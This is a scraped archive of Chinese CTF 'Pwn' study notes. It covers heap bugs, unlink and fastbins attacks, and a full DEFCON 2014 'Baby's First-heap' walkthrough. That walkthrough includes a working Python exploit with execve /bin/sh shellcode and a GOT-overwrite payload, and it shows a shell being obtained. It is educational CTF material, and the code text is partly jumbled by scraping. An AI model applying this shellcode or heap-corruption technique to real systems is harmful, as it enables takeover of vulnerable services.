使用原本存在于stack上的二重引用(A→B→C)的指针，通过A修改B的低字节，通过B修改C，… 类似这样的攻略方式 条件竞争(Race Condition) 当资源管理对于竞争的处理不正确时，会发生这种情况 对一个对象同时进行多个操作，可能会导致该对象的状态出现问题 例如，在多人共享数据的服务中，客户端A和B同时连接的情况下，B在A打开某个文件的时候对该文件进行删除操作，类似这种情况 在某些情况下，数据可能被破坏，Use After Free或者Double Free，或者是堆溢出或栈溢出 TOCTOU条件竞争(Time-of-check Time-of-use Race Condition) 在A和B两次操作之间，因为另一个操作改变了状态 例如A[检查文件属性(确认它不是符号链接)]，B[读取文件], 在A和B两次操作之间，文件被重写为符号链接，那么B将从符号链接读取内容 使用未初始化的数据(Using Uninitialized Variable) 使用之前已经被使用过的数据可能会导致意外操作 例如，申请的内存，未初始化的数据是”%p%p%p…”，如果未初始化直接使用printf将导致格式化字符串攻击之类的 负数处理问题 在条件比较情况中，没有正确考虑signed和unsigned的差异，从而将负数是别成大的正数的问题 它能够使得条件比较变得奇怪，以及更改指针索引等操作，也可能更改操作逻辑 整数溢出(Integer Overflow) 在32位数字和64位数字中，如果超出最大值或最小值，则会发生溢出。 例如，通过条件比较后故意溢出，可能导致申请很大的内存，或者使其很小 目录遍历 当二进制程序处理PATH时，可能被利用 使用../../../../../proc/self/maps 之类的可以用于获取内存映射信息 其他Unlink经典题目Plaid CTF 2014 – Pwnables200 –ezhp 基本信息： menu显示后，读取用户输入 可以输入1-4，使用jmp_table[idx]的形式调用对应函数 四个函数命名为add_note, remove_note, change_note, print_note add_note/remove_note有自己定义的malloc/free实现方式及堆管理 使用这样的结构体 1234567struct note &#123; unsigned int size; note* next; note* prev; char* msg; ... &#125; change_note有明显的溢出漏洞 可以通过重写next和prev来进行Unlink Attack 攻略方法： 这个二进制程序没有开启NX，服务器上开启了ASLR，这里有几种方法 通过Unlink让GOT指向堆chunk(与前面的babyfirst-heap相同的方式) https://fail0verflow.com/blog/2014/plaidctf2014-pwn200-ezhp.html http://tasteless.eu/2014/04/plaidctf-2014-ezhp-writeup/ 结合Unlink来泄漏堆值，写入GOT及jmp shellcode http://x86overflow.blogspot.jp/2014/04/plaidctf-pwnable-200-ezhp.html https://docs.google.com/document/d/19Tpc7skiAJCof-rQgwQQN1uZ6baq0KW4Ag910RybCC4/edit?pli=1 http://daehee87.tistory.com/386 https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug 结合Unlink，任意内存地址读写的方法 读取GOT的值，计算libc的偏移地址，加载system https://github.com/osirislab/CTF-Solutions/blob/master/PCTF_2014/ezhp/ezhp.py 通过Unlink将ppret加载到GOT并执行read(0, note[id], size) 返回note[id]将不通过read而通过ppret，也就能够执行shellcode https://pastebin.com/mEHQdcRW (只是有一定概率成功) HITCON CTF 2014 Pwnables 550 –stkof 基本信息： 读取用户输入 可以输入1-3，调用对应函数 三个函数命名为alloc_mem, write_mem, free_mem alloc_mem获得的地址，存储在bss上的PTR_TABLE[IDX++]中 write_mem有明显的溢出问题 可以通过重写next, prev进行fastbins attack 攻略方法： 这个二进制程序启用了NX，ASLR，有两种之前提到的可用方法 通过覆盖chunk，让bss中存在的地址被认为是已经释放状态，故意创建了一个Use After Free情况，之后进行Unlink Attack http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/ 使用fastbins attack的简单解法 https://rzhou.org/~ricky/hitcon2014/stkof/ 附加了详细解释 http://pastebin.com/pwCxUE2V (fastbins attack) http://pastebin.com/3hiWVeNw (Unlink attack) Hack.lu CTF Exploiting400 oreo基本信息： 显示menu后，读取用户输入 可以输入1-5，调用对应函数 五个函数命名为Add_new_rifle, Show_added_rifles,Order_selected_rifles,Leave_a_Message_with_your_Order, Show_current_stats 使用这样的结构体： struct RIFLE { char description[25]; char name[25]; char align[2]; RIFLE* next; } Add_new_rifle有明显的溢出问题 可以通过覆盖next进行fastbins attack 攻略方法： 这个二进制程序启用了NX，ASLR 另外，使用了自定义的libc，无法猜测偏移量。攻略方法有三种 想办法找出自定义libc中system的偏移地址 http://ctl.ovh/wapiflapi/oreo.py https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/oreo/ 这是官方预期解法 使用ret2dl_runtime_resolve+DT_DEBUG http://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/ 查找自定义libc中system的偏移量 猜测官方使用的是latest source构建的libc 从Gentoo Linux的每周Auto build的stage3.tar.bz2中获取libc，计算偏移量 http://www.pastebin.com/9vq38BYH","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit","slug":"DEFCON-2014-CTF-Baby-s-First-heap-动态分析及exploit","date":"2019-03-28T02:10:17.000Z","updated":"2019-03-28T02:11:24.570Z","comments":true,"path":"2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-动态分析及exploit/","link":"","permalink":"https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/","excerpt":"","text":"考虑Unlink Attack分配260字节后堆是这样的 这次为了详细说明，图中也显示size memcpy()造成溢出 array[11]现在是使用中状态，可以通过堆溢出使其成为类似free状态的结构 具体地说，就是通过堆溢出写入size，fd，bk等 free()的时候，判断是否执行unlink()相关操作 Unlink的判断，会对array[10]之上和之下的chunk各进行一次 对上面的chunk，检查自身size变量上的PREV_INUSE比特位(此处省略，暂时不关注) 对下面的chunk，检查下面第二个chunk的size上的PREV_INUSE比特位(注意这个) array[10]进行free时，检查上面和下面的chunk是否是free状态 PREV_INUSE比特位是1，所以认为array[11]是使用中状态 如何找到下面第二个的size变量位置 根据array[10]的位置加上size，能够找到array[11]的位置 根据array[11]的位置加上size，能够找到array[12]的位置 通过伪造size来伪造位置 例如，将array[11]的size更改为-4 使260字节数据的末尾比特是偶数 这样从array[10]看的话，下面的chunk就是free状态，会进行unlink 要得到下面第二个chunk的位置，需要加上这个size，它是负数 这样计算得到的array[12]的地址是array[10]的末尾，它的PREV_INUSE是0，使得系统认为array[11]是free状态 其他的注意点 实际的内存中，-4表示为0xfffffffc array[11]的size变量末尾也存在PREV_INUSE比特位，是1 因为array[10]到现在为止还是使用中状态，如果是0的话在unlink之前就会出错 Unlink之前，fd和bk准备成以下状态 此时，执行以下操作（P应视为array[11]） P-&gt;fd-&gt;bk = P-&gt;bk P-&gt;bk-&gt;fd = P-&gt;fd Unlink完成后，X周围区域已被重写 array[10]周围也被重写 调整使得X-&gt;bk成为printf的GOT(保存函数地址的区域) 从260字节区域开始写入shellcode 当调用printf的时候，会跳转到shellcode 动态分析及检查实际上是否真的按这个流程，我们可以用gdb来进行观察 安装gdb和之后使用的socat $ apt-get install gdb socat 安装peda $ git clone https://github.com/longld/peda.git ~/peda $echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit peda的检查 $ gdb -q /bin/ls 启动后，输入’start’，当出现彩色画面时，说明安装成功 我经常写下面这种gdb脚本文件 123456789101112131415161718192021222324$ cat cmdset follow-fork-mode childdef show_heap printf &quot;array[10].ptr begin\\n&quot; x&#x2F;8xw *(int*)($esp+0x60) printf &quot;array[10].ptr end-0x10\\n&quot; x&#x2F;8xw *(int*)($esp+0x60)+0x104-0x10 printf &quot;array[11].ptr begin\\n&quot; x&#x2F;8xw *(int*)($esp+0x68) printf &quot;array[11].ptr end-0x10\\n&quot; x&#x2F;8xw *(int*)($esp+0x68)+0x374-0x10end# memcpyb *0x08048AA6# freeb *0x08048afa ignore 2 0x0ashell perl -e &#39;print &quot;\\x00&quot;x260 . pack(&quot;III&lt;&quot;, 0xfffffffd, 0x804C004-8, 0x804F350)&#39; &gt; pwnr &lt; pwn 因为alarm()会妨碍分析，使用peda的函数使其无效 显示heap分配的内存地址信息 在free和memcpy上创建断点(不对前10次free断点) 堆的地址是本身是随机的，这里通过gdb运行是固定地址，除非明确关闭对应选项。我的环境中第11个堆地址是硬编码的，就是这个 memcpy()前后 产生了堆溢出，覆盖了下一个chunk 第11次free前后 第11次free之后 查看printf@got 可以看到已经被重写为堆的地址 原始的值是这样 之后继续运行 跳到了0x0804f350(堆区域)，SIGSEGV 我们已经控制了EIP的值(可以在此处写入shellcode) 进行exploit接下来只需要写脚本 以这个为基础 perl -e &#39;print &quot;\\x00&quot;x260 . pack(&quot;III&lt;&quot;, 0xfffffffd, 0x804C004-8, 0x804F350)&#39; shellcode还没准备好 需要将””\\x00”x260”的部分改为shellcode 堆地址的动态对应 堆地址本身是随机的，这道题目将其显示出来的 实际环境中，是需要通过网络发送payload后，在远程服务器获取flag 实施NW通信 写一个脚本 首先需要一个网络发送数据的模板 参考PPP的Write-up #!/usr/bin/python # -*- coding: utf-8 -*- import socket, struct, re, telnetlib def sock(remoteip, remoteport): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((remoteip, remoteport)) return s, s.makefile(&apos;rw&apos;, bufsize=0) def read_until(f, delim=&apos;¥n&apos;): data = &apos;&apos; while not data.endswith(delim): data += f.read(1) return data def p(a): return struct.pack(&quot;&lt;I&quot;,a) def shell(s): t = telnetlib.Telnet() t.sock = s t.interact() 12345678910- 实际攻击部分如下- 可以在下面地址找到shellcode，也可以自己构造 - http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;- 堆地址的动态对应只需要使用正则表达式解析服务器响应- # linux/x86/execve_binsh shellcode = &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80&quot; s, f = sock(“localhost”, 4088)#s, f = sock(“katagaitai.orz.hm”, 1111)ret = read_until(f, “Write to object [size=260]:”)print retheap_addr = int(re.findall(r”loc=([^]]+)”, ret)[10], 16)print hex(heap_addr) sc = “\\xeb\\x08” + ‘¥x00’*8 + shellcode.ljust(250, ‘¥x00’) + p(0xfffffffd) + p(0x0804C004-8) + p(heap_addr)f.write(sc + “\\n”)shell(s) 123456- 最终完整代码在这里- &lt;https:&#x2F;&#x2F;pastebin.com&#x2F;Cw6haUw5&gt;- #!/usr/bin/python -- coding: utf-8 --import socket, struct, re, telnetlib ###################### useful function definitiondef sock(remoteip, remoteport): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((remoteip, remoteport)) return s, s.makefile(‘rw’, bufsize=0) def read_until(f, delim=’\\n’): data = ‘’ while not data.endswith(delim): data += f.read(1) return data def p(a): return struct.pack(“&lt;I”,a) def shell(s): t = telnetlib.Telnet() t.sock = s t.interact() ###################### main linux/x86/execve_binshshellcode = “\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80” s, f = sock(“localhost”, 4088)#s, f = sock(“katagaitai.orz.hm”, 1111)ret = read_until(f, “Write to object [size=260]:”)print retheap_addr = int(re.findall(r”loc=([^]]+)”, ret)[10], 16)print hex(heap_addr) sc = “\\xeb\\x08” + ‘¥x00’*8 + shellcode.ljust(250, ‘¥x00’) + p(0xfffffffd) + p(0x0804C004-8) + p(heap_addr)f.write(sc + “\\n”)shell(s) 1234567891011121314- 由于Unlink稍微破坏了数据的开头，因此适当地连接0xEB 0x08，以便相对跳转可以跳过开头的2到10个字节。## 发送exploit后的内存情况(memcpy之后)![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032708.jpg)当unlink完成时，0x0804f350被写入printf@got，也就是说，当调用printf时，它会跳转到0x0804f350。但是，unlink之后，进行P-&gt;bk-&gt;fd &#x3D; P-&gt;fd这样的处理，第5-8字节被破坏了，因此第一二字节使用了short jmp跳过了被破坏的区域，进入执行shellcode# NW通信测试## 实际NW环境 $ adduser user$ cp ./heap /home/user/$ chown user:user /home/user/heap$ su user$ socat TCP-LISTEN:4088,fork,reuseaddr EXEC:/home/user/heap &amp;$ exit $ netstat -antpu |grep socattcp 0 0 0.0.0.0:4088 0.0.0.0:* LISTEN 17728/socat$ 12345678## 尝试以另一个用户身份运行脚本- 以运行socat的用户权限打开shell - 访问前修改脚本中的IP信息为远程环境信息- $ id uid=0(root) gid=0(root) groups=0(root) $ python exp.py (略) [FREE][address=9AA4C98] [FREE][address=9AA5058] [FREE][address=9AA5350] id uid=501(user) gid=502(user) groups=502(user)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"DEFCON 2014 CTF-Baby's First-heap 基本知识及静态分析","slug":"DEFCON-2014-CTF-Baby-s-First-heap-基本知识及静态分析","date":"2019-03-26T01:23:15.000Z","updated":"2019-03-26T01:24:24.408Z","comments":true,"path":"2019/03/26/DEFCON-2014-CTF-Baby-s-First-heap-基本知识及静态分析/","link":"","permalink":"https://darkwing.moe/2019/03/26/DEFCON-2014-CTF-Baby-s-First-heap-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E5%8F%8A%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/","excerpt":"","text":"Setup 下载题目文件到Linux系统环境中 http://shell-storm.org/repo/CTF/Defcon-22-quals/heap-1/ 文件名有点长，做下重命名 mv babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c heap 赋予运行权限 chmod +x heap 运行 ./heap 不能运行的话，可能是因为使用的是64位系统 在x86_64环境中运行不能直接运行x86的二进制程序 Ubuntu 14.04以后版本 dpkg --add-architecture i386 apt-get update apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 $ apt-get install gcc-multilib g++-multilib 123456## 初步调查- 每次都需要做的初步检查 - $ file heap heap: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=1b4e88004c13ca18ef78ac90b298c1e247c1d4e5, with debug_info, not stripped $ ldd heap linux-gate.so.1 (0xf7ee0000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ce8000) /lib/ld-linux.so.2 (0xf7ee2000) $ checksec --file heap #http://www.trapkit.de/tools/checksec.html RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 113 Symbols No 0 8 heap 1234- 使用的库函数列表 - Relocation section &apos;.rel.plt&apos; at offset 0x558 contains 14 entries: Offset Info Type Sym.Value Sym.Name 0804c000 00000107 R_386_JUMP_SLOT 00000000 mprotect@GLIBC_2.0 //更改内存属性 0804c004 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 //显示文字 0804c008 00000307 R_386_JUMP_SLOT 00000000 memcpy@GLIBC_2.0 //拷贝内存 0804c00c 00000407 R_386_JUMP_SLOT 00000000 signal@GLIBC_2.0 //定义收到信号时的操作 0804c010 00000507 R_386_JUMP_SLOT 00000000 alarm@GLIBC_2.0 //在一段时间后提出异常 0804c014 00000607 R_386_JUMP_SLOT 00000000 _IO_getc@GLIBC_2.0 //读取一个字符 0804c018 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 //显示一行 0804c01c 00000807 R_386_JUMP_SLOT 00000000 __gmon_start__ //使用gprof等收集统计信息时使用的函数。由于通常不使用它，因此可以忽略它 0804c020 00000907 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 //退出函数 0804c024 00000a07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 //调用main的包装函数 0804c028 00000b07 R_386_JUMP_SLOT 00000000 fprintf@GLIBC_2.0 //向文件指针输出内容 0804c02c 00000c07 R_386_JUMP_SLOT 00000000 setvbuf@GLIBC_2.0 //更改缓冲行为 0804c030 00000d07 R_386_JUMP_SLOT 00000000 memset@GLIBC_2.0 //设置内存值 0804c034 00000e07 R_386_JUMP_SLOT 00000000 sbrk@GLIBC_2.0 //扩张heap区域 1234567891011121314151617181920 上述函数没有bind, listen, accept等，因为没有实现NX处理## fork-server型与xinetd型- CTF题目常见的有两种- fork-server型，xinetd型- fork-server型 - 二进制程序中有bind-&gt;listen-&gt;accept的类型 - ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032501.jpg) - 这种情况下，需要去调试子进程 - 如果未在gdb中设置set follow-fork-mode child，则仅调试父进程(并且父进程将继续存在，因此您需要每次都kill父进程)- xinetd型 - 二进程程序中没有bind-&gt;listen-&gt;accept的类型(用xinetd代替) - ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032502.jpg) - 在这种情况下，使用gdb等工具调试时，不需要考虑NW - 但是，在实际编写exploit进行测试时，可以用过socat来添加NW关系 - 也就是说，对于xintd型，在调试时不需要考虑NW交换，但在编写exploit时需要考虑NW上的通信## 简单运行了解下流程 $ ./heap ... [ALLOC][loc=84354B0][size=823] Write to object [size=260]: AAAAA // 尝试输入简单的值 Copied 6 bytes. [FREE][address=8431008] ... [FREE][address=84354B0] Did you forget to read the flag with your shellcode? Exiting // 什么也没发生 12## 由于之前有[size &#x3D; 260]的描述，尝试发送260个字节 $ python -c &apos;print &quot;A&quot;*260&apos; | ./heap //使用python生成260个字符，发送给二进制程序 ... [ALLOC][loc=8E3E4B0][size=823] Write to object [size=260]: Copied 261 bytes. [FREE][address=8E3A008] ... [FREE][address=8E3C058] [1] 7910 done python -c &apos;print &quot;A&quot;*260&apos; | 7911 segmentation fault (core dumped) ./heap //crash了，如果是259个字符，则刚好不会crash 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# 静态分析- 下载安装IDA Free版本 - https:&#x2F;&#x2F;www.hex-rays.com&#x2F;products&#x2F;ida&#x2F;support&#x2F;download.shtml- 启动后，加载要分析的二进制文件并等待一段时间以完成分析- Options→General更改一些设置 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032503.jpg)- Graph View的整体视图如下所示 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032504.jpg)- 基本上，可以通过call指令和引用字符串作为提示推测程序流程 - 即便不怎么读程序汇编代码，也能够通过使用方式来了解大概- 很难一口气阅读所有内容 - 我试着一点一点分组阅读 - 对于很明显的循环部分，可以先放在一起## 循环部分先放在一起，稍后再看![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032505.jpg)左边这些选中部分注释为ALLOC LOOP，由于左下方块中存在字符串ALLOC，因此可能执行此类处理- 其他的循环也同样添加注释，最后看起来应该是这样的（很容易想象）![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032506.jpg)点击这个将重新展开## 分析第一块- 堆栈顶部是变量- 选择变量后按&#39;N&#39;键可以进行命名- &#39;:&#39; 对这一行进行注释- &#39;Insert&#39;在这一行上方进行注释- &#39;Shift&#39;+&#39;insert&#39;在这一行下方进行注释- 对于不知道的函数，可以通过&#96;man &lt;function name&gt;&#96;进行检索- 深蓝色文字是符号，可以双击跳转- 如果需要返回可以按&#39;Esc&#39;，或者工具栏上的&#39;←&#39;按钮- 粗略阅读时，使用这些会使得可读性很好- 目的是为了理解代码内容以及解释反编译的代码## 第一块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032507.jpg)C语言代码大概像这样 setvbuf(stdout, 0, 2, 0); signal(14, sig_alarm_handler); alarm(0x5Au); //90秒后，调用sig_alarm_handler并将其杀死 mysrand(0x1234u); //可能是随机数种子设置（但每次都固定） puts(&quot;\\nWelcome to your first heap overflow...&quot;); puts(&quot;I am going to allocate 20 objects...&quot;); puts(&quot;Using Dougle Lee Allocator 2.6.1...\\nGoodluck!\\n&quot;); exit_func = do_exit; //复制退出时调用的函数指针 printf(&quot;Exit function pointer is at %X address.\\n&quot;, &amp;exit_func); 12345678910111213141516171819202122232425262728293031323334353637383940## 第二块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032508.jpg)- 仔细看这段代码- stack上看起来有ptr, size, ptr, size…这样的20个排列 - Structures窗口中，制作结构体会更加容易 - Insert→指定结构体名称 - 可以通过反复按&#39;D&#39;切换类型 - db: 1byte - dw: 2byte - dd: 4byte - 按&#39;N&#39;对变量重命名 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032509.jpg)- 切换到Stack frame窗口，选中这个变量- Edit→Struct var，应用创建的结构体 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032511.jpg)- &#39;N&#39;重命名为array- 然后使用数字键盘上的&#39;*&#39;进行数组排列 - size是20 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032512.jpg)- stack上进行结构体应用后大概像这样 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032510.jpg)- C语言代码大概像这样- for ( i = 0; i &lt;= 0x13; ++i ) //20次循环 { random_size = randrange(0x200u, 0x500u); //很容易理解的随机数生成 if ( i == 10 ) //第11次固定260 random_size = 260; array[i].ptr = malloc(random_size); //分配random_size的内存 array[i].size = random_size; //保存这个随机值 printf(&quot;[ALLOC][loc=%X][size=%d]\\n&quot;, array[i].ptr, random_size); } 123456## 第三块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032601.jpg)C语言代码大概像这样： printf(&quot;Write to object [size=%d]:\\n&quot;, array[10].size); count = get_my_line(&amp;buff, 0x1000u); //stack上的buffer中读取最多0x1000个字符 memcpy(array[10].ptr, &amp;buff, count); //复制到指针指向区域(产生堆溢出) printf(&quot;Copied %d bytes.\\n&quot;, count); 123456## 第四块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032602.jpg)C语言代码大概像这样 for ( i = 0; i &lt;= 0x13; ++i ) //20次free { printf(&quot;[FREE][address=%X]\\n&quot;, array[i].ptr); free(array[i].ptr); } 123456## 第五块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032603.jpg)C语言代码大概像这样 exit_func(1u); return 0; 12## 总体代码逻辑 int main(void){ setvbuf(stdout, 0, 2, 0); signal(14, sig_alarm_handler); alarm(0x5Au); //90秒后，调用sig_alarm_handler并将其杀死 mysrand(0x1234u); //可能是随机数种子设置（但每次都固定） puts(&quot;\\nWelcome to your first heap overflow...&quot;); puts(&quot;I am going to allocate 20 objects...&quot;); puts(&quot;Using Dougle Lee Allocator 2.6.1...\\nGoodluck!\\n&quot;); exit_func = do_exit; //复制退出时调用的函数指针 printf(&quot;Exit function pointer is at %X address.\\n&quot;, &amp;exit_func); for ( i = 0; i &lt;= 0x13; ++i ) //20次循环{ random_size = randrange(0x200u, 0x500u); //很容易理解的随机数生成 if ( i == 10 ) //第11次固定260 random_size = 260; array[i].ptr = malloc(random_size); //分配random_size的内存 array[i].size = random_size; //保存这个随机值 printf(“[ALLOC][loc=%X][size=%d]\\n”, array[i].ptr, random_size);}printf(“Write to object [size=%d]:\\n”, array[10].size);count = get_my_line(&amp;buff, 0x1000u); //stack上的buffer中读取最多0x1000个字符memcpy(array[10].ptr, &amp;buff, count); //复制到指针指向区域(产生堆溢出)printf(“Copied %d bytes.\\n”, count); for ( i = 0; i &lt;= 0x13; ++i ) //20次free{ printf(“[FREE][address=%X]\\n”, array[i].ptr); free(array[i].ptr);} exit_func(1u);return 0;} 时间序列表示堆的状态 20次重复，第11个固定260byte 指针及size一起存储在stack中 第11个节点进行堆溢出 从前到后依次free() 已知信息 只是申请内存，覆盖和释放 申请的内存不用于其他 是一道关于覆盖堆管理区域的问题 这也可以从启动消息中理解 Welcome to your first heap overflow…I am going to allocate 20 objects…Using Dougle Lee Allocator 2.6.1…Goodluck! 看起来就是想让使用Unlink Attack","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记8:fastbins attack","slug":"Pwn学习笔记8-fastbins-attack","date":"2019-03-21T06:32:22.000Z","updated":"2019-03-21T06:33:08.053Z","comments":true,"path":"2019/03/21/Pwn学习笔记8-fastbins-attack/","link":"","permalink":"https://darkwing.moe/2019/03/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08-fastbins-attack/","excerpt":"","text":"fastbins为了高速化而实现的机制 www.valinux.co.jp/technologylibrary/document/linux/malloc0001/ bins和fastbins 之前提到过libc中存在一个为了快速搜索free区域而存在的链表 这是arena(malloc_state构造体)中存在的列表头 free状态的chunk根据相似大小来管理，因此会有多个列表 size比较小的chunk，free的时候会暂时和fastbins连接 这个链表是单向的 每个chunk在x86环境下是小于64字节，x86_64环境下是小于128字节 也存在bk成员变量，但因为高速化，不会使用到 进入fastbins的小的chunk如果是像下面这样的状态，就存在堆溢出 覆盖fd 这就可能进行fastbins attack 正常的malloc() 假设有一个像这样的fastbins列表 各个chunk根据size连接到fastbins列表 图中也显示size，因为它很重要 取出fastbins的第一个元素，进行简单的检查 检查P-&gt;size，判断它是否在正确的fastbins列表里 连接到fastbins的小的chunk是根据size大小决定要连接到哪个fastbins列表上 之后，将其从列表中删除 exploit的流程 通过P2上的堆溢出覆盖fastbins上的P的fd 使其指向X 进行malloc()的时候P被unlink fastbins列表现在和X相连接 下次进行malloc()时，就可能返回X 但是X下面没有合适的size也不行 因为存在判断它是否在正确的列表中 原本malloc()的返回值是堆的地址，通过这种方式就能够让返回X 假设X是一个保存函数地址的区域(例如GOT) 也就可以通过对malloc()的返回值，也就是X进行特定值写入，来覆盖GOT 有什么困难 这不仅是对用户进程的hack，还要跟踪libc中的内容 fastbins感觉不太出名 仅通过分析给出的二进制程序来解决它是不可能的 需要了解libc.so中malloc和free的行为相关知识","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记7:Unlink Attack 中级","slug":"Pwn学习笔记7-Unlink-Attack-中级","date":"2019-03-19T07:13:31.000Z","updated":"2019-03-19T07:15:18.503Z","comments":true,"path":"2019/03/19/Pwn学习笔记7-Unlink-Attack-中级/","link":"","permalink":"https://darkwing.moe/2019/03/19/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07-Unlink-Attack-%E4%B8%AD%E7%BA%A7/","excerpt":"","text":"特殊的Unlink AttackUnlink Attack的应用 HITCON CTF 2014上，有一道只有三支队伍解出的题目 Pwnables 550 - stkof 解出题目的是以下三支队伍： tomcr00se PPP teamlol 介绍一下用于解决这道题目的技术 这道题目是x86_64的二进制程序，但我会用x86的内存布局来说明它 注意，实际的二进制中，各个区域都是两倍 如果能够满足下述约束条件，就能够进行特殊的Unlink Attack P-&gt;fd-&gt;bk == P P-&gt;bk-&gt;fd == P 不仅需要堆溢出，Use After Free也是必须的 exploit的流程 假设预先存在指向P的X X在.bss区域中，并且预先知道地址 X指向已经free的P，就像它尚未被释放一样 我们无法控制X指向的地址 通过堆溢出进行覆盖 P-&gt;fd:X之前12字节 P-&gt;bk:X之前8字节 如图所示： 从X-0xC的位置开始看的话，X相当于bk的位置 从X-0x8的位置开始看的话，X相当于fd的位置 也就是说，P-&gt;fd-&gt;bk == X-0xC-&gt;bk == X == P &amp;&amp; P-&gt;bk-&gt;fd == X-0x8-&gt;fd == X == P，满足条件 free(P2)的时候，相连接的P被unlink 本应该无法控制的X的值现在可以被更改 X应该最初指向P X的指向(=*X)，存在保存用户输入的情况 使用(Use After Free的)X，可能覆盖P 然后X-0xC的内容将改变 也就是说，X-0xC可以被改为指向GOT X-0xC的指向(=*(X-0xC))，存在保存用户输入的情况 信任X-0xC并且写入数据 能够进行GOT overwrite 这种方法是Shellphish战队子大会结束后公开的技术 http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/ 他们在比赛期间也没有解决 有图的话会非常容易理解，实际上的exploit构造非常麻烦 事实上，也存在更容易理解的解法： 